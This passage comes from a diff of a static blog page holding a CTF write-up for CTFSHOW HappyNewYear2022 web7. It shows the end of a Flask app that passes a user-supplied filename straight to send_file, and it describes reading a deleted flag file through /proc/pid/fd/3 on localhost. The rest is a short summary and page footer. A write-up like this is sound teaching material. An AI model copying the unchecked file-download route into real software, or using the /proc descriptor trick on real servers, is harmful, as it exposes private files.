class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(request.args[<span class="string">&#x27;filename&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<p>This python script open the flag file without close, then remove the file. I test actions like this through an local script, and I found removed file can still access from script at <code>/proc/pid/fd/3</code>. Then read this file through <code>http://127.0.0.1:5000/download/?filename=/proc/pid/fd/3</code>.<br><img src="flag1.png" alt="flag1">  </p>
+<h2 id="Summarize"><a href="#Summarize" class="headerlink" title="Summarize"></a>Summarize</h2><p>This time I used some tricks I learned from hackthebox. This is positive feedback for me to spend more time on hackthebox next. Maybe it’s not a bad idea Hah?<br>And the ctfshow lottery drew me and gave me a one-month bilibili membership as a prize, thanks.</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Solving"><span class="toc-number">1.</span> <span class="toc-text">Challenge Solving</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-File"><span class="toc-number">1.1.</span> <span class="toc-text">Source File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unserialization-Analyzing"><span class="toc-number">1.2.</span> <span class="toc-text">Unserialization Analyzing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POP-Chain-Building"><span class="toc-number">1.3.</span> <span class="toc-text">POP Chain Building</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summarize"><span class="toc-number">2.</span> <span class="toc-text">Summarize</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&text=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&is_video=false&description=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF Writeups - CTFSHOW HappyNewYear2022 web7&body=Check out this article: https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&name=CTF Writeups - CTFSHOW HappyNewYear2022 web7&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&t=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    b_y
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.7/dist/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'recharging-runtime';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
